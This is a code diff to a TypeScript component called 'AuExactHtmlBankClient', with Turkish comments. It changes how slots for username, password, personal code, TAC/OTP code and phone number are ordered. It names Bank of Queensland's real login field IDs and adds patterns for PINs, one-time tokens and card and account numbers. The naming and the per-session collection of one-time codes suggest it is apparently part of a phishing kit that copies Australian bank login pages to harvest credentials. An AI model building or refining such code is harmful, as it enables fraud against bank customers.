@@ -1016,11 +1016,23 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       const uniqueSlots = Array.from(deduped.values());
       const sortScore = (s: Slot): number => {
         const k = s.key.toLowerCase();
-        if (k === "username" || k === "personalcode" || k === "bankphone") return 1;
+        // ⭐ BOQ KLASİK SIRALAMA GARANTİSİ (EN ÖNEMLİ Sıra: username(1) > password(2) > personalCode(3) > tacCode(4) > bankPhone(5))
+        //   ESKİ YANLIŞ: username, personalcode, bankphone HEPSİ score=1 → AYNI SIRA!
+        //   BOQ 3 input var: txtUserid(username) / password / txtUserSignon(personalcode=UserID)
+        //   ESKİ SİSTEMDE POOL sıralaması karışır, kişisel kod 1. sıraya (password/username ile yanyana) düşebiliyordu.
+        if (k === "username") return 1;
         if (k === "password") return 2;
-        if (k === "taccode") return 3;
+        if (k === "personalcode") return 3;
+        if (k === "taccode") return 4;
+        if (k === "bankphone") return 5;
+        // Fallback type bazlı:
         if (s.type === "password") return 2;
-        // Key yoksa kind tanıma: rawKey regex ile tahmin et
+        if (/pass|pin|secret/i.test(s.key)) return 2;
+        if (/tac|otp|token|passcode|rsa/i.test(s.key)) return 4;
+        if (/phone|mobile|tel/i.test(s.key)) return 5;
+        if (/personal|userid|member|signon|identity|customer.*no|cif/i.test(s.key)) return 3;
+        if (/user|customer|access.*id|access.*no|client|card|account/i.test(s.key)) return 1;
+        // Key yoksa 9 (en düşük öncelik, sona atılır)
         return 9;
       };
       uniqueSlots.sort((a, b) => sortScore(a) - sortScore(b));
